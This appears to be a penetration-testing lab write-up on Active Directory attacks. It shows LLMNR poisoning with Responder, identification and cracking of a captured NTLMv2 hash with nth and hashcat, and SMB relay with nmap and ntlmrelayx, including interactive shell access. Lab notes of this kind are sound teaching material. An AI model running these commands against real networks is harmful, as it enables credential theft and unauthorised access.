# LLMNR (Link Local Multicast Name Resolution))
#### LLMNR is a key feature in Active Directory used to hail other hosts on the network if DNS fails to do so. The DC sends out a broadcast asking any connected host to respond.  Any that do confirm the response by sending a username and NTLM password hash back.  Using Responder, a MITM sniffer, we can intercept this signal and attempt to crack the hash or reuse it in a login attempt aka 'passing the hash'.  We will explore both, as well as examples of how we could use responder during an engagement.

####  So how do we use this in the real world on an engagement?  I mean, users aren't logging into thier shares by typing in our eth0, right?  Correct but they may make a typo like \\shaere01\Documents instead of \\share01\Documents.  That's all it takes for LLMNR to take over and Responder is there to intercept.  Another scenario:  A user runs a login script

#### Start Responder on your eth0
#### We can find our eth0 with the `ip a` command:
![image](https://user-images.githubusercontent.com/76034874/186995673-2c0efa17-d788-4a41-b39a-6704c839518a.png)


`responder -I eth0 -v`
![image](https://user-images.githubusercontent.com/76034874/186995327-2bf3e6da-c1a8-448f-84b2-d92a052d132a.png)

#### Simulate a user logging into their terminal for the day:



#### and shortly responder intercepts a response:
![image](https://user-images.githubusercontent.com/76034874/186996305-77a429b1-3581-4f19-bb16-8e0246bcbaf8.png)






### One of my favorite hash identifiers is nth (apt install name-that-hash)
the syntax looks like this: 
``` bash
nth -t 'fcastle::MARVEL:b5767a2e087ea531:157C0B6B863C13119F038A5C01F702D7:0101000000000000805C66FF6AB9D801840E548DADCD23980000000002000800300037005200490001001E00570049004E002D0048004F004E004D0041004A0035004D0031004900460004003400570049004E002D0048004F004E004D0041004A0035004D003100490046002E0030003700520049002E004C004F00430041004C000300140030003700520049002E004C004F00430041004C000500140030003700520049002E004C004F00430041004C0007000800805C66FF6AB9D801060004000200000008003000300000000000000001000000002000001C9851B85E8B1F50D2CC6B325325427C08CA439D04EBABC76FA4ACAA8FB6C5F20A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0030002E0032002E00330030000000000000000000'
```
![image](https://user-images.githubusercontent.com/76034874/186991763-66c543f3-e84e-4f03-9d3a-de036f2e85a7.png)


### Now we can copy-pasta the entire hash in a file on our attack machine via `nano hash.txt`
### using hashcat, we can see if we can crack this hash by running it against rockyou.txt for this demo.  In the real world, if this fails, we would use a more custom, bigger wordlist to make sure our weak password test is thorough and up to date.
syntax: `hashcat -O -m 5600 hash /usr/share/wordlists/rockyou.txt`
![image](https://user-images.githubusercontent.com/76034874/186996929-a065c526-cf10-44ad-900e-7f4d5cfa1253.png)



# SMB RELAY

using nmap builtin script to search for smb status on port 445:
syntax: `nmap --script=smb2-security-mode.nse -p445  10.0.2.0/24 | grep "smb2-security-mode" -A2 -B8`
![image](https://user-images.githubusercontent.com/76034874/187007262-4d503d3c-80fa-4744-8a6f-5baab830b309.png)

![image](https://user-images.githubusercontent.com/76034874/187007785-4e591c12-dfb8-4cea-bb3c-c09c4a7db798.png)


login in to Spiderman machine and create an event:
try to access a share: 10.0.2.30
syntax: `ntlmrelayx.py -tf targets.txt -smb2support`
#### We can see the hashes come through. We can either crack these or relay them.  Sometimes we find password reuse.  For example the same password found here could be used to log into the anti-virus program.
![image](https://user-images.githubusercontent.com/76034874/187008490-680f5243-efc4-4a78-b269-2558b2188c1b.png)


Interactive Mode:
syntax: `ntlmrelayx.py -tf targets.txt -smb2support -i`
![image](https://user-images.githubusercontent.com/76034874/187008783-7a4a8830-4796-495e-b1a1-8efafd69e439.png)

now we start a netcat listener in another terminal on our attack box at 127.0.0.1 11002
and we open up to a shell, type 'help' to see a list of commands.  We can upload or download files with get and put.  We could upload our own reverse shell or run any windows command in the ntlmrelay command line.


![image](https://user-images.githubusercontent.com/76034874/187009309-f8dca5d0-8da0-4e4f-a705-6d289d1bae30.png)
![image](https://user-images.githubusercontent.com/76034874/187009336-bf0f7849-c3e3-4fa8-a88a-d0e40abb8f4b.png)


